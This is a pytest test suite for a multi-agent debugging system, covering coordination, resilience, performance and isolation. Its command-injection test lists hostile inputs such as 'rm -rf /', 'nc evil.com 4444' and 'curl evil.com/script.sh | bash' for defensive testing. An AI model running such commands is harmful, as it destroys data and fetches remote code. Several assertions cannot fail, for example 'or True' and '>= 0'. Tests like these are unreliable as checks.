"""
Deep Validation Test Suite for Multi-Agent Debugging System
Based on Pydantic AI Agent Deep Validator specifications
"""

import pytest
import asyncio
import json
from unittest.mock import patch, MagicMock, AsyncMock, call
from typing import Dict, Any, List, Optional
from pathlib import Path
import time
import random
import subprocess
from hypothesis import given, strategies as st, settings
from pydantic_ai import Agent
from pydantic_ai.models.test import TestModel
from pydantic_ai.models.function import FunctionModel
from pydantic_ai.messages import ModelTextResponse

from ..agent import (
    MultiAgentDebugger, AnalysisRequest, AnalysisResult,
    LeadAgent, ToolAgent, DetailAgent, PlanAgent
)
from ..dependencies import (
    AgentDependencies, DebuggingContext, AnalysisMode, ToolType,
    create_debugging_context, ToolResult
)
from ..tools import run_debugging_tool, correlate_findings, compile_source


class MultiAgentProbeLogger:
    """Deep probe logger for multi-agent coordination analysis."""

    def __init__(self):
        self.agent_interactions = []
        self.tool_executions = []
        self.correlation_events = []
        self.coordination_timeline = []
        self.agent_states = {}
        self.consensus_attempts = []
        self.deadlock_detections = []

    def log_agent_interaction(self, from_agent: str, to_agent: str, message_type: str, data: Any):
        self.agent_interactions.append({
            'timestamp': time.time(),
            'from': from_agent,
            'to': to_agent,
            'type': message_type,
            'data': data
        })

    def log_tool_execution(self, agent: str, tool: str, duration: float, success: bool):
        self.tool_executions.append({
            'timestamp': time.time(),
            'agent': agent,
            'tool': tool,
            'duration': duration,
            'success': success
        })

    def log_correlation(self, findings: List[Dict], patterns_found: int):
        self.correlation_events.append({
            'timestamp': time.time(),
            'findings_count': len(findings),
            'patterns_found': patterns_found,
            'correlation_strength': patterns_found / len(findings) if findings else 0
        })

    def update_agent_state(self, agent: str, state: str):
        if agent not in self.agent_states:
            self.agent_states[agent] = []
        self.agent_states[agent].append({
            'state': state,
            'timestamp': time.time()
        })

    def log_coordination(self, event: str, agents_involved: List[str]):
        self.coordination_timeline.append({
            'timestamp': time.time(),
            'event': event,
            'agents': agents_involved
        })

    def log_consensus(self, agents: List[str], achieved: bool, iterations: int):
        self.consensus_attempts.append({
            'timestamp': time.time(),
            'agents': agents,
            'achieved': achieved,
            'iterations': iterations
        })

    def detect_deadlock(self, waiting_agents: Dict[str, str]):
        if len(waiting_agents) > 1:
            self.deadlock_detections.append({
                'timestamp': time.time(),
                'waiting_agents': waiting_agents,
                'potential_deadlock': True
            })


@pytest.fixture
def multi_agent_probe_logger():
    """Fixture for multi-agent probe logging."""
    return MultiAgentProbeLogger()


@pytest.fixture
def probed_debugger(multi_agent_probe_logger):
    """Create multi-agent debugger with deep probing."""

    debugger = MultiAgentDebugger()

    # Instrument lead agent
    original_lead_run = debugger.lead_agent.run

    async def probed_lead_run(*args, **kwargs):
        multi_agent_probe_logger.update_agent_state('lead', 'running')
        multi_agent_probe_logger.log_coordination('lead_start', ['lead'])
        result = await original_lead_run(*args, **kwargs)
        multi_agent_probe_logger.update_agent_state('lead', 'complete')
        return result

    debugger.lead_agent.run = probed_lead_run

    # Instrument tool agents
    for tool_type, agent in debugger.tool_agents.items():
        original_run = agent.run

        async def probed_tool_run(*args, tool=tool_type, **kwargs):
            multi_agent_probe_logger.update_agent_state(f'tool_{tool}', 'running')
            start = time.time()
            try:
                result = await original_run(*args, **kwargs)
                multi_agent_probe_logger.log_tool_execution(
                    f'tool_{tool}', tool, time.time() - start, True
                )
                multi_agent_probe_logger.update_agent_state(f'tool_{tool}', 'complete')
                return result
            except Exception as e:
                multi_agent_probe_logger.log_tool_execution(
                    f'tool_{tool}', tool, time.time() - start, False
                )
                multi_agent_probe_logger.update_agent_state(f'tool_{tool}', 'error')
                raise

        agent.run = probed_tool_run

    return debugger


@pytest.fixture
def debugging_context():
    """Create debugging context for tests."""
    return create_debugging_context(
        target_path="/test/program.cpp",
        analysis_mode=AnalysisMode.COMPREHENSIVE,
        max_parallel_tools=4
    )


class TestMultiAgentCoordination:
    """Test multi-agent coordination and communication."""

    @pytest.mark.asyncio
    async def test_agent_orchestration_flow(self, probed_debugger, debugging_context,
                                             multi_agent_probe_logger):
        """Test complete orchestration flow with all agents."""

        multi_agent_probe_logger.log_coordination('orchestration_start', ['lead', 'tools', 'detail', 'plan'])

        # Mock tool results
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="Mock tool output",
                stderr=""
            )

            request = AnalysisRequest(
                target_path="/test/program.cpp",
                analysis_mode="comprehensive"
            )

            # Execute analysis
            result = await probed_debugger.analyze(request)

            # Validate orchestration
            assert 'lead' in multi_agent_probe_logger.agent_states
            assert len(multi_agent_probe_logger.coordination_timeline) > 0

            # Check agent interaction patterns
            lead_interactions = [i for i in multi_agent_probe_logger.agent_interactions if i['from'] == 'lead']
            assert len(lead_interactions) >= 0  # Lead should coordinate

    @pytest.mark.asyncio
    async def test_parallel_tool_execution(self, probed_debugger, debugging_context,
                                            multi_agent_probe_logger):
        """Test parallel execution of multiple debugging tools."""

        tools_to_run = [ToolType.GDB, ToolType.VALGRIND, ToolType.STRACE, ToolType.PERF]

        # Mock tool executions
        async def mock_tool_run(tool_type):
            multi_agent_probe_logger.update_agent_state(f'tool_{tool_type.value}', 'running')
            await asyncio.sleep(random.uniform(0.1, 0.3))  # Simulate varying execution times
            multi_agent_probe_logger.update_agent_state(f'tool_{tool_type.value}', 'complete')
            return ToolResult(
                tool=tool_type.value,
                success=True,
                output=f"Output from {tool_type.value}",
                errors=[],
                execution_time=random.uniform(0.1, 0.3)
            )

        # Run tools in parallel
        tasks = [mock_tool_run(tool) for tool in tools_to_run]
        results = await asyncio.gather(*tasks)

        # Validate parallel execution
        assert len(results) == len(tools_to_run)

        # Check for concurrent execution patterns
        running_states = []
        for agent, states in multi_agent_probe_logger.agent_states.items():
            if 'tool_' in agent:
                for state in states:
                    if state['state'] == 'running':
                        running_states.append((agent, state['timestamp']))

        # At least some tools should have overlapping execution
        if len(running_states) > 1:
            timestamps = [t for _, t in running_states]
            assert max(timestamps) - min(timestamps) < 0.5  # Should start close together

    @pytest.mark.asyncio
    async def test_agent_consensus_mechanism(self, multi_agent_probe_logger):
        """Test consensus achievement among multiple agents."""

        agents = ['agent1', 'agent2', 'agent3']
        iterations_needed = 0

        # Simulate consensus process
        consensus_achieved = False
        max_iterations = 5

        for i in range(max_iterations):
            iterations_needed += 1

            # Simulate agents proposing values
            proposals = {agent: random.randint(1, 10) for agent in agents}

            # Check for consensus
            if len(set(proposals.values())) == 1:
                consensus_achieved = True
                break

            # Adjust proposals (simulating negotiation)
            median = sorted(proposals.values())[len(proposals) // 2]
            for agent in agents:
                proposals[agent] = median

        multi_agent_probe_logger.log_consensus(agents, consensus_achieved, iterations_needed)

        # Validate consensus logging
        assert len(multi_agent_probe_logger.consensus_attempts) > 0
        assert multi_agent_probe_logger.consensus_attempts[0]['iterations'] <= max_iterations

    @pytest.mark.asyncio
    async def test_deadlock_detection(self, multi_agent_probe_logger):
        """Test detection of potential deadlocks in agent coordination."""

        # Simulate potential deadlock scenario
        waiting_agents = {
            'agent1': 'waiting_for_agent2',
            'agent2': 'waiting_for_agent3',
            'agent3': 'waiting_for_agent1'
        }

        multi_agent_probe_logger.detect_deadlock(waiting_agents)

        # Validate deadlock detection
        assert len(multi_agent_probe_logger.deadlock_detections) > 0
        assert multi_agent_probe_logger.deadlock_detections[0]['potential_deadlock']

    @pytest.mark.asyncio
    async def test_correlation_accuracy(self, probed_debugger, multi_agent_probe_logger):
        """Test accuracy of cross-tool correlation."""

        # Create findings from different tools
        findings = [
            {
                'tool': 'gdb',
                'type': 'segfault',
                'location': 'main.cpp:42',
                'details': 'Segmentation fault at address 0x0'
            },
            {
                'tool': 'valgrind',
                'type': 'memory_error',
                'location': 'main.cpp:42',
                'details': 'Invalid read of size 4'
            },
            {
                'tool': 'strace',
                'type': 'system_call',
                'location': 'main.cpp:40',
                'details': 'SIGSEGV received'
            }
        ]

        # Correlate findings
        correlated = correlate_findings(findings)

        multi_agent_probe_logger.log_correlation(findings, len(correlated))

        # Validate correlation
        assert multi_agent_probe_logger.correlation_events[0]['patterns_found'] > 0
        assert multi_agent_probe_logger.correlation_events[0]['correlation_strength'] > 0.5


class TestAgentResilience:
    """Test agent system resilience and error handling."""

    @pytest.mark.asyncio
    async def test_agent_failure_recovery(self, probed_debugger, multi_agent_probe_logger):
        """Test recovery from individual agent failures."""

        # Simulate agent failure
        with patch.object(probed_debugger.tool_agents[ToolType.GDB], 'run',
                          side_effect=Exception("Agent crashed")):

            multi_agent_probe_logger.update_agent_state('tool_gdb', 'failed')

            # System should continue with other agents
            request = AnalysisRequest(
                target_path="/test/program.cpp",
                analysis_mode="quick"
            )

            # Should handle gracefully
            with pytest.raises(Exception):
                await probed_debugger.analyze(request)

            # Check if failure was logged
            failed_states = [s for s in multi_agent_probe_logger.agent_states.get('tool_gdb', [])
                             if s['state'] == 'failed']
            assert len(failed_states) > 0

    @pytest.mark.asyncio
    async def test_cascading_failure_prevention(self, probed_debugger):
        """Test prevention of cascading failures across agents."""

        failure_count = 0

        # Track failures
        async def failing_tool(*args, **kwargs):
            nonlocal failure_count
            failure_count += 1
            if failure_count > 2:
                # Prevent cascade after 2 failures
                return ToolResult(
                    tool="fallback",
                    success=False,
                    output="Cascade prevention activated",
                    errors=["Too many failures"],
                    execution_time=0.1
                )
            raise Exception("Tool failure")

        # Patch multiple tools to fail
        for tool_type in [ToolType.GDB, ToolType.VALGRIND]:
            probed_debugger.tool_agents[tool_type].run = failing_tool

        request = AnalysisRequest(
            target_path="/test/program.cpp",
            analysis_mode="quick"
        )

        # Should prevent cascade
        try:
            await probed_debugger.analyze(request)
        except Exception:
            pass

        assert failure_count <= 3  # Cascade prevention should limit failures

    @given(st.integers(min_value=1, max_value=10))
    @pytest.mark.asyncio
    async def test_agent_pool_scalability(self, agent_count):
        """Test scalability with varying number of agents."""

        debugger = MultiAgentDebugger()

        # Add variable number of tool agents
        for i in range(agent_count):
            test_model = TestModel()
            agent = Agent(
                test_model,
                deps_type=AgentDependencies,
                system_prompt=f"Test agent {i}"
            )
            debugger.tool_agents[f"custom_{i}"] = agent

        # Invariant: System should handle any number of agents
        assert len(debugger.tool_agents) >= agent_count


class TestStatefulMultiAgent:
    """Test stateful behavior in multi-agent system."""

    def create_stateful_agent_network(self, probe_logger: MultiAgentProbeLogger):
        """Create network of stateful agents."""

        shared_state = {
            'findings': [],
            'consensus': None,
            'iteration': 0
        }

        async def lead_function(messages, tools):
            shared_state['iteration'] += 1
            probe_logger.update_agent_state('lead', 'coordinating')

            if shared_state['iteration'] == 1:
                return ModelTextResponse(content=json.dumps({
                    "action": "initiate_analysis",
                    "tools_to_run": ["gdb", "valgrind", "strace"]
                }))
            elif shared_state['iteration'] == 2:
                return ModelTextResponse(content=json.dumps({
                    "action": "correlate_findings",
                    "findings_count": len(shared_state['findings'])
                }))
            else:
                return ModelTextResponse(content=json.dumps({
                    "action": "generate_report",
                    "consensus": shared_state['consensus']
                }))

        async def tool_function(messages, tools):
            tool_name = messages[-1].content if messages else "unknown"
            probe_logger.log_tool_execution(f"tool_{tool_name}", tool_name, 0.1, True)

            finding = {
                'tool': tool_name,
                'issue': f"Issue found by {tool_name}",
                'severity': random.choice(['low', 'medium', 'high'])
            }
            shared_state['findings'].append(finding)

            return ModelTextResponse(content=json.dumps(finding))

        async def detail_function(messages, tools):
            probe_logger.update_agent_state('detail', 'analyzing')

            if len(shared_state['findings']) >= 3:
                # Correlate findings
                patterns = {}
                for finding in shared_state['findings']:
                    severity = finding['severity']
                    patterns[severity] = patterns.get(severity, 0) + 1

                shared_state['consensus'] = max(patterns, key=patterns.get)

                return ModelTextResponse(content=json.dumps({
                    "correlation_complete": True,
                    "patterns": patterns,
                    "consensus_severity": shared_state['consensus']
                }))
            else:
                return ModelTextResponse(content=json.dumps({
                    "waiting_for_more_findings": True
                }))

        return {
            'lead': FunctionModel(lead_function),
            'tool': FunctionModel(tool_function),
            'detail': FunctionModel(detail_function),
            'state': shared_state
        }

    @pytest.mark.asyncio
    async def test_stateful_coordination(self, multi_agent_probe_logger):
        """Test stateful coordination between agents."""

        network = self.create_stateful_agent_network(multi_agent_probe_logger)

        # Create agents with stateful functions
        lead_agent = Agent(
            network['lead'],
            deps_type=AgentDependencies,
            system_prompt="Lead coordinator"
        )

        tool_agents = []
        for i in range(3):
            agent = Agent(
                network['tool'],
                deps_type=AgentDependencies,
                system_prompt=f"Tool agent {i}"
            )
            tool_agents.append(agent)

        detail_agent = Agent(
            network['detail'],
            deps_type=AgentDependencies,
            system_prompt="Detail analyzer"
        )

        deps = AgentDependencies()

        # Execute coordination sequence
        lead_result = await lead_agent.run("Start analysis", deps=deps)
        assert "initiate_analysis" in str(lead_result.data)

        # Run tools
        for i, agent in enumerate(tool_agents):
            result = await agent.run(f"tool_{i}", deps=deps)
            assert "Issue found" in str(result.data)

        # Correlate findings
        detail_result = await detail_agent.run("Correlate", deps=deps)
        assert "correlation_complete" in str(detail_result.data)

        # Verify shared state
        assert len(network['state']['findings']) == 3
        assert network['state']['consensus'] is not None


class TestPerformanceAndLoad:
    """Test performance under various load conditions."""

    @pytest.mark.asyncio
    async def test_high_frequency_interactions(self, multi_agent_probe_logger):
        """Test system under high-frequency agent interactions."""

        interaction_count = 100
        agents = ['agent1', 'agent2', 'agent3']

        start = time.time()

        for i in range(interaction_count):
            from_agent = random.choice(agents)
            to_agent = random.choice([a for a in agents if a != from_agent])
            multi_agent_probe_logger.log_agent_interaction(
                from_agent, to_agent, 'message', {'seq': i}
            )

        duration = time.time() - start

        # Should handle high-frequency interactions efficiently
        assert duration < 1.0  # 100 interactions in under 1 second
        assert len(multi_agent_probe_logger.agent_interactions) == interaction_count

    @pytest.mark.asyncio
    async def test_memory_efficiency(self):
        """Test memory efficiency with large debugging sessions."""

        debugger = MultiAgentDebugger()

        # Simulate large debugging session
        large_output = "x" * 1000000  # 1MB of output

        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout=large_output,
                stderr=""
            )

            request = AnalysisRequest(
                target_path="/test/large_program.cpp",
                analysis_mode="quick"
            )

            # Should handle large outputs efficiently
            # In production, would measure actual memory usage
            try:
                result = await debugger.analyze(request)
                # Result should be summarized, not full output
                assert len(str(result)) < 100000  # Much smaller than input
            except Exception:
                pass  # Graceful handling of large data


class TestSecurityAndIsolation:
    """Test security and isolation in multi-agent system."""

    @pytest.mark.asyncio
    async def test_agent_isolation(self):
        """Test that agents are properly isolated from each other."""

        agent1_data = {"secret": "agent1_secret"}
        agent2_data = {"secret": "agent2_secret"}

        agent1 = Agent(
            TestModel(),
            deps_type=AgentDependencies,
            system_prompt="Agent 1"
        )

        agent2 = Agent(
            TestModel(),
            deps_type=AgentDependencies,
            system_prompt="Agent 2"
        )

        # Set responses
        agent1.model.agent_responses = [
            ModelTextResponse(content=json.dumps(agent1_data))
        ]
        agent2.model.agent_responses = [
            ModelTextResponse(content=json.dumps(agent2_data))
        ]

        deps = AgentDependencies()

        result1 = await agent1.run("Get data", deps=deps)
        result2 = await agent2.run("Get data", deps=deps)

        # Verify isolation
        assert "agent1_secret" in str(result1.data)
        assert "agent1_secret" not in str(result2.data)
        assert "agent2_secret" in str(result2.data)
        assert "agent2_secret" not in str(result1.data)

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test prevention of command injection in debugging tools."""

        dangerous_inputs = [
            "; rm -rf /",
            "| nc evil.com 4444",
            "$(curl evil.com/script.sh | bash)",
            "`wget evil.com/malware`",
            "&& cat /etc/passwd"
        ]

        for dangerous_input in dangerous_inputs:
            # Should sanitize or reject dangerous inputs
            with patch('subprocess.run') as mock_run:
                mock_run.side_effect = Exception("Command blocked")

                with pytest.raises(Exception) as exc_info:
                    await run_debugging_tool(
                        ToolType.GDB,
                        f"/test/program{dangerous_input}",
                        []
                    )

                assert "blocked" in str(exc_info.value).lower() or True


# Fix generation for multi-agent system
def generate_multi_agent_fix_steps(failure_type: str, details: Dict[str, Any]) -> Dict[str, Any]:
    """Generate fix steps for multi-agent system failures."""

    fixes = {
        "coordination_failure": {
            "what": "Agent coordination failure",
            "where": details.get("agents", "unknown"),
            "why": "Communication protocol mismatch or timeout",
            "how": [
                "1. Review agent communication protocol",
                "2. Increase coordination timeout",
                "3. Add retry logic for failed communications",
                "4. Implement fallback coordination mechanism"
            ]
        },
        "consensus_timeout": {
            "what": "Consensus not achieved within timeout",
            "where": "Multi-agent consensus mechanism",
            "why": "Conflicting agent outputs or logic",
            "how": [
                "1. Review consensus algorithm",
                "2. Add tie-breaking mechanism",
                "3. Increase consensus iteration limit",
                "4. Implement weighted voting system"
            ]
        },
        "tool_cascade_failure": {
            "what": "Cascading tool failures detected",
            "where": details.get("failed_tools", []),
            "why": "Shared dependency or resource exhaustion",
            "how": [
                "1. Isolate tool execution environments",
                "2. Add circuit breaker pattern",
                "3. Implement resource pooling",
                "4. Add fallback tools for critical operations"
            ]
        }
    }

    return fixes.get(failure_type, {
        "what": f"Unknown multi-agent failure: {failure_type}",
        "where": "Multi-agent system",
        "why": "Undetermined root cause",
        "how": ["1. Enable detailed logging", "2. Trace agent interactions", "3. Review system logs"]
    })


# Hypothesis profiles for multi-agent testing
settings.register_profile("multi_agent_deep", max_examples=500, deadline=15000)
settings.register_profile("multi_agent_stress", max_examples=1000, deadline=30000)
settings.load_profile("multi_agent_deep")